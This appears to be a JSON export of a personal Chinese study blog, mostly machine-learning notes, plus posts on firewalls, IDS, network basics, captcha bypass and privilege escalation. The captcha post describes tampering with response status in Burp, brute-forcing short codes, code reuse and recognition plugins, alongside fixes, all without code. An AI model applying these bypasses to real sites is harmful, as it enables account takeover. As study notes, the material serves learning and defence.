vgg(conv_arch)NiN(网络中的网络)全连接层的问题\n\n卷积层需要较少的参数\n但卷积层后的第一个全连接层的参数非常多\n\nNiN块\n\n一个卷积层跟两个1x1卷积层(当作全连接层)\n\n\nNiN架构\n\n无全连接层\n交替使用NiN块和步幅为2的最大池化层, 逐步减小高宽和增大通道数\n最后使用全局平均池化层得到输出\n其输入通道数是类别数\n\n\n\n\nGoogLeNet(含并行连结的网络)Inception块\n四个路径从不同层面抽取信息, 然后再输出通道维合并\n\n\n白色的卷积用来改变通道数，蓝色的卷积用来抽取信息。\n\n最左边一条1X1卷积是用来抽取通道信息，其他的3X3卷积用来抽取空间信息。\n\n通过降低通道数来控制模型复杂度, 每条路上的通道数可能不同\n\n它的一个主要优点是模型参数小, 计算复杂度低\n\n\nGoogLeNet结构\n\nResNet (残差网络)\n对于非嵌套函数类, 较复杂(图中较大区域)的函数类不能保证更加逼近真实, 而嵌套函数类能保证更加复杂的模型起码不会更差\n残差块\n\n\n残差块使得很深的网络更加容易训练, 甚至可以训练一千层的网络\nResNet块\n\n\n\nResNet如何解决梯度消失\nResNet的操作相当于$$y’’ &#x3D; g(f(x))变为y’’&#x3D;f(x) + g(f(x))$$这样其导数$$\\frac{∂y’’}{∂w}&#x3D;\\frac{∂y}{∂w}+\\frac{∂y’}{∂w}$$即使y&#39;的导数非常小, 加上y的导数后也不会太小\n","slug":"ML-现代卷积神经网络","date":"2024-08-20T12:35:28.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"f7de8d8b747477c8ddf056b54ebdb44d","title":"ML 卷积神经网络","content":"卷积神经网络卷积层 在卷积层中, 使用卷积核在输入图像上滑动, 并计算卷积核与局部图像块之间的点积, 生成特征图, 这一过程称为卷积。\n如图, 3x3的卷积核在4x4的图像上滑动, 生成2x2的特征图\n\n通过这种方式，卷积层能够捕捉图像中的边缘、纹理等局部特征。\n\n例如，一个简单的卷积核, 用于检测水平边缘:\n\n$$K &#x3D; \\begin{pmatrix} -1 &amp; -1 &amp; -1 \\ 0 &amp; 0 &amp; 0 \\ 1 &amp; 1 &amp; 1 \\end{pmatrix}$$\n\n图像上某一局部区域的像素值在卷积操作中，如果存在水平方向上的亮度变化（例如，从黑色像素到白色像素），卷积的结果就会是一个较大的值，表示该区域存在水平边缘\n\n卷积核和偏移(b)是可学习的参数\n卷积核的大小是超参数\n填充和步幅(Padding, strides)\n\n填充和步幅是卷积层的超参数\n填充正在输入周围添加额外的行&#x2F;列, 来控制输出的减少量\n步幅是每次滑动卷积核的步长, 可以成倍的减少输出的形状\n\n通道神经网络中另外一个重要的超参数是通道数\n多个输入通道\n\n彩色图片一般有RGB三个通道\n\n每个通道都有一个卷积核, 结果是所有通道卷积结果的和\n\n\n多个输出通道\n\n为什么要有多个输出通道？因为不管有多少个输入通道只会得到单输出通道的话是不够的\n\n如果对每一个输出通道有一个三维的卷积核，这个卷积核会输出自己的通道（就相当于在三维的基础上又加了一维 i ，这一维表示输出的通道数）\n\n可以有多个三维卷积核, 每个核生成一个输出通道\n\n每个输出通道可以识别特定模式\n\n输入通道核识别并组合输入中的模式\n\n\n1x1卷积层\n卷积核的高和宽都等于1，意味着它不会识别空间信息，因为他每次只看一个空间像素所以不会去识别通道中的空间信息\n\n1x1卷积不识别空间模式, 只是融合不同通道的信息\n\n相当于输入形状为n_h*n_w*c, 权重为c_o*c_i的全连接层\n\n\n作用\n\n融合不同通道的信息, 可以认为是不做空间的匹配, 只是在输入层直接做输入通道和输出通道的融合, 等价于将整个输入拉成一个向量, 通道数等于特征的数量, 卷积核就相当于一个全连接层\n\n1x1卷积可以在不改变输入特征图空间分辨率的情况下, 改变其通道数, 卷积层的输出的通道数由卷积核的个数决定, 通过设置1x1卷积核的数量, 可以做到升维&#x2F;降维\n\n\n池化层二维最大池化\n返回滑动窗口的最大值\n\n例如2x2最大池化将卷积输出增加左右各一个像素, 这样就允许了1个像素的移位, 缓解了卷积层对位置的敏感性\n\n平均池化层\n返回滑动窗口的平均值\n\n\n总结:\n\n池化层返回窗口的最大或平均值\n缓解卷积层对位置的敏感性\n同样有窗口大小, 填充, 步幅作为超参数\n\n批量归一化\n损失出现在最顶端, 顶部的层训练比较快, 底部训练的很慢\n底部层变化时, 所以层都得跟着变, 后面的层需要重新学习很多次, 导致训练变慢\n因此提出:可以在学习底部层的时候避免变化顶部层吗?\n[5分钟深度学习] #06 批量归一化 Batch Normalization_哔哩哔哩_bilibili\n批量归一化根据以下表达式转换\n$$\\mathrm{BN}(\\mathbf{x}) &#x3D; \\boldsymbol{\\gamma} \\odot \\frac{\\mathbf{x} - \\hat{\\boldsymbol{\\mu}}_\\mathcal{B}}{\\hat{\\boldsymbol{\\sigma}}_\\mathcal{B}} + \\boldsymbol{\\beta}.$$\n  批量归一化层 BN层\n\n作用在\n全连接层和卷积层的输出上, 激活函数前\n全连接层和卷积层的输入上\n\n\n对于全连接层, 作用在特征维\n对于卷积层, 作用在通道维\n\n总结\n\n批量归一化固定小批量中的均值和方差, 然后学习适合的偏移和缩放\n批评了归一化可以加快收敛速度, 但一般不改变模型精度\n\n","slug":"ML-卷积神经网络","date":"2024-08-13T15:50:25.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"39515fa3daf39399dd3c634d18623133","title":"ML 模型选择","content":"训练误差和泛化误差\n训练误差: 模型在训练数据上的误差\n泛化误差: 模型在新数据上的误差\n\n验证数据集和测试数据集\n验证数据集: 原来评估模型好坏\n验证数据集用于模型训练过程中进行验证和调参。通过在验证集上评估模型性能，可以监控模型是否过拟合，并且通过验证集来选择最优的超参数（如学习率、正则化强度等）\n通常占数据集的10%-15%。验证集的数据不参与训练，主要用于在训练期间监控模型性能。\n\n\n测试数据集\n测试数据集用于在模型训练完毕后评估其泛化能力。这部分数据从未在模型训练或验证过程中使用过，因此可以较为客观地评估模型在真实世界中的表现。\n\n\n\nK折交叉验证\n在没有足够多数据时使用\n算法:\n将心力衰竭分为k块\nFor i &#x3D; 1, …, k\n使用第i块作为验证数据集, 其余为训练数据集\n\n\n报告k个验证集误差的平均\n\n\n\n模型容量\n\n指拟合各种函数的能力 \n低容量的模型难以拟合训练数据\n高容量的模型可以记住所有的训练数据\n\n模型容量的影响\n\n数据复杂度\n样本个数\n\n每个样本的元素个数\n\n时间, 空间结构\n\n多样性\n\n\n","slug":"ML-模型选择","date":"2024-08-11T14:33:31.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"facafb096b5ef997f3a4dae703a34ceb","title":"ML 多层感知机","content":"多层感知机最简单的深度学习网络称为多层感知机\n感知机(PLA)感知机只有输入层和输出层, 是单个神经元模型, 是一个线性二分类器, 但是不能对非线性的数据进行有效的分类, 感知机公式:\n\n感知机结构如下, 只有输入层, 输出层\n多层感知机(MLP)多层感知机由感知机推广而来,  有多个层, 通常包括一个输入层, 一个或多个隐藏层, 一个输出层\n\n","slug":"ML-多层感知机","date":"2024-08-11T08:53:57.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"2ea4b478b03dd04505dba1266ed29eac","title":"ML 数据操作","content":"数据操作数组例:\n\n零维 一个数字\n\n一维 多个数字\n\n二维 矩阵(长*宽)\n\n三维 RGB图片(通道*长*宽)\n\n四维 图片批量(通道*长*宽*批量)\n\n五维 视频(通道*长*宽*批量*时间)\n\n\n使用shape属性访问张量的形状和元素总数\ntxtx = tensor([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])\nx.shape = torch.Size([12])reshape函数可以改变张量的形状\ntxtX = x.reshape(3, 4)\n\nX = tensor([[ 0,  1,  2,  3],\n        [ 4,  5,  6,  7],\n        [ 8,  9, 10, 11]])广播机制形状不同的数组可以调用广播机制执行按元素操作 \n如\ntxta = tensor([[0],\n            [1],\n            [2]])\n b = tensor([[0, 1]])如果执行a + b\n计算时, a, b会进行复制变换(实际没有改变)\ntxta = tensor([[0, 0],\n             [1, 1],\n             [2, 2]])\nb = tensor([[0, 1],\n            [0, 1],\n            [0, 1]])txta + b = tensor([[0, 1],\n                [1, 2],\n                [2, 3]])","slug":"ML-数据操作","date":"2024-08-10T03:09:24.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"82fd8a20d046045f9dc01ea9c9906ce2","title":"ML 多分类问题","content":"多分类问题从回归到分类回归\n单连续数值输出\n跟真实值的区别作为损失\n\n分类\n通常多个输出\n输出i时预测为第i类的置信度(概率)\n\nsoftmax 回归算法Softmax回归，又称多类别逻辑回归，是一种广泛用于多分类问题的算法。它是逻辑回归的扩展，能够处理具有多个类别的分类任务。\nSoftmax 回归算法的模型可以表示为：\n \n在二分类问题中, 逻辑回归使用sigmoid函数将输入映射到一个概率值, 在多分类问题中, 我们使用softmax函数将输入映射到一组的概率值, 这些概率值的和为1\n损失函数Softmax回归使用交叉熵损失函数来衡量预测结果和真实标签之间的差距\n\n一般的表示为\n\n其中 x 是输入特征，y 是输出类别, yk表示真实标签的 one-hot 编码形式，K 是类别总数。\n","slug":"ML-多分类问题","date":"2024-08-04T09:32:35.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"13909e268f0450d522608f992a88d1f0","title":"ML 神经网络","content":"神经网络用于识别复杂模式和数据中的特征。是机器学习和深度学习中的基础工具，特别适用于处理图像、语音和文本等非结构化数据。\n层（Layer）神经元按层组织，每一层的神经元与上一层的神经元相连。通常，神经网络包括输入层、隐藏层和输出层。\n\n输入层：接收外部数据作为输入。\n\n隐藏层：通过多个隐藏层进行复杂的特征提取和模式识别。\n\n输出层：输出最终的预测结果或分类结果。\n\n\n\n每一层的输出成为下一层的输入 \n激活函数在多层神经网络中, 上层节点的输出和下层节点的输入之间存在一个函数关系, 这个函数称为激活函数\n激活函数的作用如果不使用激活函数(或者是只使用线性激活函数), 那么每一层节点的输入都是上层输出的线性变换, 这种情况下, 无论神经网络有多少层, 输出都只会是输入的线性组合, 网络的效果与没有隐藏层时的效果差不多, 网络的逼近能力就非常有限\n\n如果引入非线性函数作为激活函数, 那么网络的表达能力就会非常强大, 几乎可以逼近任何函数\n激活函数的选择\nsigomoid$$\\sigma(x) &#x3D; \\frac{1}{1 + e^{-x}}$$适用场景：用于输出层处理二分类问题。\n\nReLU$$ReLU(x)&#x3D;max(0,x)$$适用场景：\n\n广泛用于隐藏层，特别是在深度神经网络中。\n用于回归问题的输出层\n\n\nSoftmax$$\\text{Softmax}(x_i) &#x3D; \\frac{e^{x_i}}{\\sum_{j} e^{x_j}}$$适用场景：用于多分类问题的输出层。\n\n\n前向传播神经网络前向传播从输入层到输出层：前向传播就是从输入层开始，经过一层层的Layer，不断计算每一层的神经网络得到的结果及通过激活函数的本层输出结果，最后得到输出的过程。\n输入层-&gt;隐藏层1\n隐藏层1-&gt;隐藏层2\n…\n隐藏层n-&gt;输出层\n反向传播\n前向传播计算出了输出值（也即预测值），就可以根据输出值与目标值的差别来计算loss\n反向传播使根据损失函数计算损失函数相对于每个参数的梯度，来调整网络的参数\n\n反向传播的步骤\n计算输出层的误差\n反向传播误差\n对于每个隐藏层，计算误差\n从输出层开始，一层层反向计算，直到输入层\n\n\n梯度计算\n参数更新\n\n","slug":"ML-神经网络","date":"2024-08-03T08:43:22.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"31038f1c745d94422e3236cfc3b2ffbe","title":"ML 正则化","content":"正则化在机器学习模型中，正则化通过在模型的损失函数中添加一个正则项来实现。这些惩罚项通常会限制模型的复杂度，使模型更加简单，从而更好地泛化到新数据。\n在代价函数中加入正则项，通过lambda的来平衡拟合程度和参数的大小，约大越容易出现过拟合的现象。\n引入正则项后的代价函数:\n\nλ 为正则化参数\n\n如果 λ 很大，正则化项的影响就很大，模型参数会被压得很小，导致模型变得简单（比如变成一条平滑的线）\n如果 λ 很小，正则化项的影响就很小，模型参数可以自由调整，模型可能会变得复杂。\n\n工作原理如果有很多参数，我们不清楚哪个参数是高阶项，即不知道惩罚哪个能获得更好拟合的结果，因此引入正则化项统一惩罚参数(正则化参数)以得到较为简单的函数\n统一惩罚能得到简单结果是因为，高阶项受到惩罚的效果会更强，反映在图像上就是使其影响变弱\n\n在线性回归中, 正则化使参数w每次都与一个小于1的数相乘, 使参数w在每次迭代中收缩一点\n\n\n可以直观的理解为，我们最小化损失函数就是求蓝圈+红圈的和的最小值，而这个值通在很多情况下是两个曲面相交的地方。\nDropout好的模型应该对输入数据的扰动更鲁棒, 使用丢弃法(dropout)在层之间加入噪音\n丢弃法对每个元素进行如下扰动\n有p的概率置为0, 否则置为x&#x2F;(1-p)(保证期望仍为x), p为丢弃概率, 是控制模型复杂度的超参数\n通常将丢弃法作用在隐藏全连接层的输出上\n\n","slug":"ML-正则化","date":"2024-08-03T06:40:12.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"447078f3f8d7cc4fd3994e9733503dbf","title":"ML 逻辑回归","content":"逻辑回归逻辑回归用来解决分类问题, 如样本标签值为0或1, 则线性回归输出的值不太符合实际, 有较大的误差\n\n对上述数据使用逻辑回归模型(这里使用了sigmoid函数), 可以得到更加精确的结果\n决策边界在分类问题中, 把不同类别的数据点分开的界限\n例如\n视情况而定, 决策边界可以是一条直线, 也可以是更加复杂的曲线\n\n逻辑回归中的代价函数逻辑回归中, 代价函数不是凹函数, 在梯度下降中, 有多个局部最小值, 因此不能使用梯度下降的方法求解全局最小值\n\n损失函数\n损失函数(loss function)是在一个训练样本的表现\n把所有训练样本的损失加起来得到的代价函数(cost function)才能衡量模型在整个训练集上的表现\n\n 逻辑回归中的损失函数\n简化后损失函数\n\n代价函数为\n\n逻辑回归中的梯度下降梯度下降公式\n\n推导得出逻辑回归的梯度下降公式与线性回归的几乎一模一样, 但是他们本质是不同的, 因为函数f是不同的\n过拟合\n差拟合 : 无法很好的适应训练集, 会有较大的误差\n\n\n泛化 : 指一个假设模型应用到新样本的能力, 我们追求泛化能力好的模型\n\n\n过拟合 : 模型过于强调拟合原始数据, 这样导致丢失了预测新数据的算法本质。对于原始数据, 该模型表现的非常好, 但是对于一个新数据, 其表现很可能会很差\n\n\n解决过拟合问题\n获取更多训练数据\n\n舍弃部分不能帮助我们正确预测的特征(可能导致有用的特征被丢弃)\n\n正则化: 保留原有特征, 减小参数大小\n\n\n","slug":"ML-逻辑回归","date":"2024-08-02T13:24:59.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"40845efb0b4bb750c2cf6ebe2ecbd4fa","title":"ML 基本概念","content":"监督学习监督学习是已经知道数据的label\n即\ntxtLearns from being given &#39;right answers&#39;.从正确答案中学习\n\n例如预测房价问题，给出了房子的面积和价格\n例如过滤垃圾邮件, 训练时给出了邮件和它是否是垃圾\n例如图像目标检测\n\n\n回归问题是预测连续值的输出，例如预测房价\n\n从无限多可能的输出数字中预测数字\n\n\n分类问题是预测离散值输出，例如判断肿瘤是良性还是恶性, 判断是猫还是狗\n\n从一小部分的可能的输出中预测类别\n\n\n\n输入通常有多个\n\n\n\n无监督学习无监督学习是不知道数据具体的含义，比如给定一些数据但不知道它们具体的信息，对于分类问题无监督学习可以得到多个不同的聚类，从而实现预测的功能。\n即\ntxtFind something interesting in unlabeled data.\n聚类 Group similar data points together.\n\n例如google news对新闻的聚类, 实现相关文章&#x2F;新闻推荐\n\n\n\n例如DNA的分析\n\n\n\n例如用户集群的划分\n\n\n其他类型\n\n异常检测\n降维\n\n线性回归(线性)回归模型是一种特殊的监督学习模型\n线性回归是拟合一条线，将训练数据尽可能分布到线上。\n有多变量的线性回归称为多元线性回归。\n下图为单变量线性回归模型\n\n代价函数即cost function, 衡量模型预测的值与真实目标值的差异, 用来评估参数的好坏, 模型会尝试找到最优的参数, 使cost尽可能小\n\n例如, 用方差表示:\n\n\n视觉上为预测值与真实值的高度差\n\n\n梯度下降一种尝试最小化代价函数的算法\n\n首先为每个参数赋一个初值, 根据代价函数的梯度, 一步一步调整参数, 得到最优解\n\n初值的不同可能会导致得到的最优解不同, 图中可能会导致两个截然不同的最优解\n\n\n梯度下降算法  a : 学习率, J: 代价函数\n\n学习率alpha表示学习率, 即每次更新的步长\n\n若学习率太小, 则每次的步太短, 则需要很多步才能达到最低, 效率太低\n若学习率太大, 则最后可能不收敛, 甚至可能发散\n\n多维特征通常, 问题都会涉及到多个变量，例如房屋价格预测就包括，面积、房间个数、楼层、价格等\n因此, 模型就要包含多个变量, \n\n也可写成向量形式\n\n矢量化使用python库numpy可以方便的进行矢量化操作, 可以使代码运行速度大大提高\n例如\npythonw = np.array([1.0, 2.5, -3])\nb = 4\nx = np.array([10, 20, 30])模型可简化为\npythonf = np.dot(w, x) + b效果相当于\npythonf = w[0] * x[0] +\n    w[1] * x[1] +\n    w[2] * x[2] + b相比与非矢量的方法, 矢量化可以并行计算, 提高效率\n\n特征缩放通常, 多个变量的大小的范围不同, 可以将所有的特征变量缩放到大致相同的范围, 这样可以通常减少梯度算法的迭代步数\n\n图中, 将数据范围分别为(0, 5)和(300, 2000)的数据缩放到了(0, 1)\n特征缩放不一定非要落到[-1，1]之间，只要数据足够接近就可以。如[0, 3]和[-2. 0.5]等等\n效果演示代码:\npythonimport numpy as np\nimport matplotlib.pyplot as plt\nfrom sklearn.preprocessing import MinMaxScaler, StandardScaler\n\nnp.random.seed(0)\nx1 = np.random.normal(100, 20, 100)\nx2 = np.random.normal(50, 10, 100)\nx3 = np.random.normal(200, 50, 100)\n\ndata = np.column_stack((x1, x2, x3))\n\nplt.figure(figsize=(12, 6))\nplt.subplot(1, 2, 1)\nplt.scatter(data[:, 0], data[:, 1], c=data[:, 2], cmap=&#39;viridis&#39;)\nplt.title(&#39;Original Data&#39;)\nplt.xlabel(&#39;Feature 1&#39;)\nplt.ylabel(&#39;Feature 2&#39;)\n\nscaler = MinMaxScaler()\ndata_normalized = scaler.fit_transform(data)\n\nplt.subplot(1, 2, 2)\nplt.scatter(data_normalized[:, 0], data_normalized[:, 1], c=data_normalized[:, 2], cmap=&#39;viridis&#39;)\nplt.title(&#39;Normalized Data&#39;)\nplt.xlabel(&#39;Feature 1&#39;)\nplt.ylabel(&#39;Feature 2&#39;)\n\nplt.show()\n","slug":"ML-基本概念","date":"2024-07-30T08:58:33.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"fc9228fdf3a5a47846f9fbbc80f2b73d","title":"网络安全设备相关知识","content":"网络安全设备网络安全设备相关知识 | Myprefer’s Blog\n防火墙作用\n控制: 对进出数据进行限制(包过滤, 如ACL)\n管理: 网络隔离, 进行安全防护(NAT)\n记录: 对进出数据进行检查, 记录相关信息\n\n功能\n在网络协议栈的各个层次上实施网络访问控制机制\n\n网络层: 包过滤\n传输层: 电路级代理\n应用层: 应用层代理&#x2F;网关\n\n\n控制网络域间传送的数据流\n\n检查网络流量\n防止脆弱或不安全的协议和服务\n防止内部网络信息外泄\n对网络存取和访问进行监控和审计\n强化网络安全策略, 集成网络安全防御机制\n\n\n\n不足\n无法防范内部的安全威胁(防外不防内\n不能防范病毒\n不能防范针对开放服务安全漏洞的渗透攻击\n不能防范针对网络客户端程序的渗透攻击\n不能防范基于隐蔽通道的特洛伊木马或僵尸网络\n\n分类\n按形态: 硬件&#x2F;软件\n按技术: 包过滤(透明模式, 连交换机)&#x2F;代理(可作路由 ,NAT, ACL)\n\n实现技术包过滤\n实现机制: 依据数据包的级别标记来控制数据包 \n优点:\n只分析数据包的IP, TCP&#x2F;UDP协议和端口, 速度快\n易于配置\n对用户透明, 不需要提供额外的密码等\n\n\n缺点:\n只在网络层, 不能识别应用层协议或维持连接状态\n安全性薄弱, 不能防止IP欺骗\n难正确制订规则\n不能引入认证机制\n\n\n\n代理网关\n每一个内外网络之间的连接都要通过防火墙的介入和转换加强了控制\n不同层面的代理技术:\n应用层: 应用层代理(HTTP代理)\n传输层: 电路级代理(Socks代理)\n网络层: NAT代理(NAT网关, 拨号上网路由器)\n\n\n\n代理(proxy)技术\n运行客户端通过代理与网络服务进行非直接的连接\n在代理服务器上可以进行服务控制和内容检查\n\n应用层代理\n也称应用层网关, 代理服务器\n代理HTTP, Email等应用层服务\n\n电路级代理\n在传输层\n同时位多种不同的应用服务提供支持\n\nNAT\n将私有地址转化为合法地址\n允许多个用户分享少量或单一的IP地址(源IP)\n允许将网络服务映射到内部服务网络IP和端口(目的NAT)\n\n状态检测\n在数据链路层和网络层之间对数据包进行检测\n创建状态表用于维护连接上下文\n特点: 安全性高, 性能高, 适应性好, 对用户和应用程序透明\n\n\n部署方式路由模式\n配置接口互联地址。（配置ip）\n配置路由，使地址路由可达。\n配置源NAT使内网服务器可以访问公网。\n放行对应的防火墙策略。\n\n\n当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台路由器。\n透明模式\n如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。\n混合模式\n如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。\n部署方法包过滤路由器\n\n优势: 成本低, 易用\n缺点:\n一旦路由器被攻破, 内网完全暴露\n内部网络信息对外公开, 可攻击开放的主机和服务\n\n\n\n双宿主堡垒主机\n\n\n\n\n\n\n\n\n堡垒主机(Bastion Host): 对外部网络暴露, 同时也是内部网络用户的主要连接点\n双宿主主机(Dual-homed Host): 至少有两个网络接口的通用计算机系统\n\n\n使用应用代理网关作为双宿主堡垒主机\n一个使用公网IP地址连接外部网络\n一个使用私有IP地址连接内部网络\n由应用代理服务器程序为特定的网络应用提供代理\n\n\n优点: 对外屏蔽内网信息, 用户身份认证和行为审计\n缺点:\n内网对外访问控制过于严格\n堡垒主机安全性差\n一旦堡垒主机被攻破, 内网也将全面暴露\n\n\n\n屏蔽主机屏蔽子网\n\n\n\n\n\n\n\n\nDMZ(Demilitarized Zone, 非军事区或停火区): 在内部网络和外部网络之间增加的一个子网\n\n\n三层防护: 外网防火墙, 应用层代理, 内网防火墙\n\n策略设置\n没有明确允许的就是禁止\n先阻止所有数据包\n放行允许的\n\n\n\n入侵检测系统(IDS)入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。\n作用\n防火墙的重要补充\n构建网络安全防御体系重要环节\n克服传统防御机制的限制\n\n功能\n监测分析用户和系统的活动\n核查系统配置和漏洞\n日志管理, 识别异常活动\n针对攻击行为作出反应\n\n技术架构\n事件产生器\n事件分析器\n响应单元\n事件数据库\n\n工作过程\n种类\n基于网络的入侵检测系统(NIDS)\nIDS可以放在防火墙或网关的后面, 以网络嗅探器的形式捕获所有的对内对外的数据包\n\n\n基于主机的入侵检测系统(HIDS)\n安全操作系统必须有一定的审计功能, 并记录相应的安全性内核\n\n\n分布式入侵检测系统(DIDS)\n\n局限性\n使用复杂\n现有技术难以满足实际性能需要\n高虚警率, 用户处理的负担重\n许多警告信息难以与入侵行为相关联\n对其他数据的检测可能会受影响\n\n安全隔离与信息交换系统(网闸)组成\n外部处理单元\n内部处理单元\n仲裁处理单元\n\n特点\n断开内外网之间的会话(物理隔离, 协议隔离)\n集成了其他安全技术\n\n\n入侵防御系统(IPS)\nIDS与IPS\nIDS: 旁路监听, 只起到检测作用\nIPS: 内联模式, 实时处置数据包\n\n统一威胁管理系统(UTM)\n防火墙 + IDS + IPS + 防毒墙\n\n网络架构安全设计\n合理划分网络安全区域\n规划网络IP地址, vlan设计\n安全配置路由交换设备\n网络边界访问控制\n网络冗余配置(HSRP\\vrrp冗余技术), 负载均衡\n防止单点故障\n提供网络健全性, 安全性\n\n\n\n","slug":"网络安全设备相关知识","date":"2024-06-13T07:40:52.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"2283e990feb15f5348765d491b77ccdf","title":"网络拓扑基础","content":"网络拓扑基础 | Myprefer’s Blog\n网络基础概念IP地址\nIP地址在网络中用于标识一个节点(或者网络设备的接口)\nIP地址用于IP报文在网络中的寻址\n\nIP地址就像现实中的地址, 可以标识网络中的一个节点, 数据就是通过它来找到目的地\nIP地址格式192.168.1.1\n网络位(192.168.1) + 主机位\n由子网掩码决定网络位长度\n\n192.168.1.1 — 255.255.255.0(掩码)\n192.168.1.1 — 255.255.0.0(掩码)\n\n\n配置IP地址shellinterface &lt;接口&gt;\nip address 192.168.1.1 255.255.255.0Dhcp\n作用: 自动给电脑&#x2F;手机配置IP地址\n\nDNS域名系统\n路由技术基础网关不同网段之间的通信需要经过网关\n路由器路由器的转发原理是通过路由表来判断数据包从哪个接口发出, 实现数据包的转发\n\n显示路由表: dis ip routing-table  &lt;ip&gt;\n\nTCP\n可靠性高, 三次握手\n延迟高\n\n适合对文件传输的完整性高, 对延迟不敏感的服务\nUDP\n速度快\n不可靠\n\n适用于网络游戏, 视频通话等\n交换机的接口模式\nAccess: 用来连接终端, 电脑, 打印机\nTrunk: 用来连接其他交换机\n\nVlan虚拟局域网\n安全, 隔离vlan-10中的设备可以ping通\nvlan-10与vlan-20中的设备不能ping通\n\n\n识别数据包属于哪个vlan:\n\n交换机进行数据包标记, 通过标签判断\n\nACL访问控制列表根据预先定义好的规则对流量进行筛选和过滤\nACL的类型\n标准访问控制列表: 只能基于源ip地址进行过滤\n扩展访问控制列表: 可以根据源、目IP，TCP&#x2F;UDP协议，源、目端口号进行过滤\n\nNAT网络地址转换用于实现私有网络和公有网络之间的互访                                                                                                   \n\nNAT外部的主机无法主动跟位于NAT内部的主机通信，NAT内部2主机想要通信，必须主动和公网的一个IP通信，路由器负责建立一个映射关系，从而实现数据的转发。\n\n静态NAT\n静态NAT实现私网地址和公网地址的一对一转换。(服务器公网IP)\n\n远程管理网络设备\ntelnet:shtelnet &lt;IP&gt; &lt;PORT&gt;\n\n","slug":"网络拓扑基础","date":"2024-06-10T08:02:31.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"957d4019e406cdfdf6bdeb295730daad","title":"内网安全-网络知识","content":"内网安全-网络知识\n隧道技术: 解决不出网协议上线的问题(利用出网协议进行封装出网)(如TCP -&gt; UDP)\n\n代理技术: 解决网络通讯不通的问题(利用跳板机建立节点后续操作)\n\n连接方向: 正向&amp;方向(内找外&#x2F;外找内)\n\n\n","slug":"内网安全-网络知识","date":"2024-06-01T03:11:57.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"8fbdf9b50722304c5111df8cc62c19b8","title":"WEB攻防-验证码安全","content":"验证码安全找回密码客户端回显&amp;Response状态值&amp;修改重定向\n用回显状态判断-res前端判断不安全\n\n不安全方式:\n\ntxt错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;浏览器   错误\n\n错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器   正确\n\n--客户端验证为准\n安全方式:\ntxt错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器显示正确-&gt;服务器后端验证错误-&gt;失败\n\n--服务器验证为准\n\n\n用用户名重定向-修改标示绕过验证\n\n验证码回显显示验证码泄漏验证虚设\n\n数据包中就有没有加密或加密过的验证码\n\n\n验证码简单机制验证码过于简单爆破\n\n如四位数字简单验证码(0000~9999), 仅10000钟可能, 如没有次数限制, 可以爆破\n\n\n\n验证码验证安全机制-爆破&amp;复用&amp;识别\n验证码简单机制-验证码过于简单爆破\n验证码重复使用验证码验证机制绕过\n验证码智能识别-验证码图形码被识别\n验证码接口调用-验证码触发机制枚举\n\n验证码技术验证码爆破，验证码复用，验证码识别等\n识别工具:\nsmxiazi&#x2F;NEW_xp_CAPTCHA: xp_CAPTCHA(瞎跑 白嫖版) burp 验证码 识别 burp插件 (github.com)\nc0ny1&#x2F;captcha-killer: burp验证码识别接口调用插件 (github.com)\n\n\n\n安全修复方案\n找回机制要进行每一步验证-防绕过重定向\n找回机制要进行服务端验证-防s数据修改\n找回机制要控制验证码安全防验证码攻击\n验证码接口需验证后被调用-防接口被乱调用\n验证码弱引用智能化人工判断-防验证码被识别\n验证码采用时间段生效失效-防验证码被复用\n\n","slug":"WEB攻防-验证码安全","date":"2024-05-07T09:32:21.000Z","categories_index":"","tags_index":"","author_index":"Myprefer"},{"id":"584f79b33380f1b716ad57e583c2d3d1","title":"权限提升","content":"权限提升Web权限获取: 插件应用, 数据库, 中间件, 网站源码后台获取… \n网站前台: REC漏洞, 代码执行, 命令执行, 写文件, 写shell\n权限划分\nLinux:\n管理员UID为0: 系统的管理员用户\n系统用户UID为1~999\n普通用户UID从1000开始\n\n\nWindows\n用户及组: system(相当于root) administrator user guest等\n\n\n\n具体的几种权限\n后台权限:\n获取方式: 爆破、注入猜解，弱口令等\n⼀般网站或应用后台智能操作应用的界面内容, 数据图片等信息，无法操作程序的源代码或服务器上的资源文件\n权限提取:\n通过账户密码等信息获取数据库等权限\n通过文件编辑操作获取网站权限Webshell等\n\n\n\n\n网站权限\n获取方式: 写文件等\n查看或修改（还要看有没有锁权）程序源代码，可以进行网站或应用的配置文件读取（接口配置信息、数据库配置信息等），还能收集服务器操作系统等相关的信息，为后续系统提权做准备\n\n\n数据库权限\n获取方式: 源码或配置文件泄露, webshell进行配置文件读取等\n操作数据库的权限，数据库的增删改查等\n权限提取:\n获取敏感数据, 获取后台权限\n写入文件, 获取webshell\n\n\n\n\n接口权限\n获取方式: 后台（修改配置信息功能点），网站权限（查看配置文件获取）\n邮件、短信、支付等功能接口\n\n\n\nWindows权限提升溢出漏洞操作前提\n本地用户 当前计算机的某个用户\nWeb权限 